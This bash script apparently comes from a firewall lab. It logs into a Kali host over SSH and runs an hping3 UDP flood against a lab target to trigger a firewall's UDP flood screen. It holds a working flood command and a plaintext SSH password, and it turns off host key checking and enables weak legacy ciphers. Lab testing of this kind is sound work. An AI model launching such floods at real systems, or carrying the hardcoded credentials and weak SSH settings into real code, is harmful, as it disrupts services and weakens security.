#!/bin/bash
# UDP Flood from Kali → Linux target
# Triggers: UDP flood SCREEN (threshold: 1000 pps)

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"
DURATION=${1:-10}

echo "=== UDP Flood Attack ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET})"
echo "Duration : ${DURATION}s"
echo "Triggers : UDP flood SCREEN (threshold: 1000 pps)"
echo ""
echo "Starting UDP flood..."

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "timeout ${DURATION} sudo /usr/sbin/hping3 --udp --flood -p 53 ${TARGET} 2>&1 | tail -5" 2>/dev/null

echo ""
echo "Attack complete. Check monitor.sh for UDP flood SCREEN hit counters."
